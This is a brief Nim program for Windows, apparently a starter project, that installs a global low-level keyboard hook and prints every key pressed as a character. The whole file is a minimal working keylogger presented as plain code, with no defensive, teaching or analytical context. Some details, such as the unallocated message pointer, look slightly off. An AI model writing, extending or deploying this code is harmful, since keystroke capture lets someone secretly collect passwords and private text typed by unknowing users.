# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.
import winim


const WH_KEYBOARD_LL = 13;
let layout = GetKeyboardLayout( 0 )
var message : LPMSG


proc callback( nCode : int32, wParam : WPARAM , lParam : LPARAM ) : LRESULT {. stdcall .}=
  
  if (nCode >= 0 and wParam == WM_KEYDOWN):
    let value = cast[ptr int32](lParam)[]
    echo char MapVirtualKeyEx( value, MAPVK_VK_TO_CHAR , layout)

  return CallNextHookEx( 0, nCode , wParam , lParam )




let moduleHandle =  GetModuleHandle( NULL)
SetWindowsHookEx(WH_KEYBOARD_LL, callback, moduleHandle, 0 );
while true:  
  GetMessage( message, -1, WM_KEYFIRST, WM_KEYLAST)

